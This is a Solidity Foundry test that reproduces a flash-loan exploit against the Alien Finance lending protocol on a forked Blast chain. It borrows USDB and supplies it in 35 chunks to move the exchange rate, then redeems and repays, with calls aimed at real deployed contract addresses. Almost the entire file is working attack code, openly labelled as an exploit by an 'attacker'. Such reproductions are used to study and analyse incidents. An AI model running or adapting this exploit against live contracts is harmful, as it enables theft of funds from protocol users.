// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC3156FlashBorrower.sol";
import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IWETH.sol";

interface ILender {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
}

interface IAToken {
    function balanceOf(address account) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IAlienFinance {
    function supply(address from, address to, address market, uint256 amount) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function redeem(address from, address to, address asset, uint256 amount) external;
    function repay(address from, address to, address asset, uint256 amount) external;
    function setUserExtension(address extension, bool allowed) external;
    function getUserAllowedExtensions(address user) external view returns (address[] memory);
    function getExchangeRate(address market) external view returns (uint256);
}

contract AllienFlashTest is Test, IERC3156FlashBorrower {
    using SafeMath for uint;
    IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
    IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
    IERC20 usbd = IERC20(0x4300000000000000000000000000000000000003);
    ILender private lender = ILender(0x45cf520dB0598b8054796E3c772C46326fb19856);
    IAToken public atoken = IAToken(0x6fF7A155557C4B516a062dFA65704b3158ea9ACf);
    address public attacker;
    IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    // IUniswapExtension private uniExten = IUniswapExtension(0xE971563C790bCc9E7916ccEd72a2e84403b411B1);
    address private constant vict = 0xBe5b1aFae3D69E0B193E18ba75Ea27E45aF9D681;
    event log_named_bool(string key, bool value);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 5561255);
        attacker = msg.sender;

        deal(address(usbd), address(this), 8_999_000 * 10**18);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", usbd.balanceOf(address(this)), 18);
        require(msg.sender == attacker, "Only attacker can start the exploit");

        address token = address(usbd);
        uint256 amount = 10000 * 10**18;  // 10,000 USDB with 18 decimals

        lender.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, "");
        emit log_named_decimal_uint("[End] Attacker usbd after exploit", usbd.balanceOf(address(this)), 18);
    }

    function onFlashLoan(
        address /*initiator*/,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(lender), "Untrusted lender");
        require(address(_token) == address(usbd), "Token mismatch");

        emit log_named_decimal_uint("[After] Attacker blast during exploit", usbd.balanceOf(address(this)), 18);

        uint256 exchangeRate = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint(" Attacker exchangerate before supply", exchangeRate, 18);

        // Supply the borrowed USDB multiple times
        uint256 balanceBeforeSupply = usbd.balanceOf(address(this));
        uint256 supplyAmount = balanceBeforeSupply / 35; // Divide the balance into 35 parts

        for (uint i = 0; i < 35; i++) {
            unchecked {
                usbd.approve(address(Allien), supplyAmount);
                Allien.supply(address(this), address(this), address(usbd), supplyAmount);
            }
        }

        uint256 atokenBalance = atoken.balanceOf(address(this));
        emit log_named_decimal_uint(" Attacker atoken after supply", atokenBalance, 18);

        uint256 afterexchangeRate = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint(" Attacker exchangerate after supply", afterexchangeRate, 18);

        // Redeem the supplied USDB
        uint256 redeemAmount = atoken.balanceOf(address(this));
        
        unchecked {
            Allien.redeem(address(this), address(this), address(usbd), redeemAmount);
        }

        emit log_named_decimal_uint("[After] Attacker blast after redeem", usbd.balanceOf(address(this)), 18);

        require(usbd.approve(address(lender), usbd.balanceOf(address(this))), "Approve failed");
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
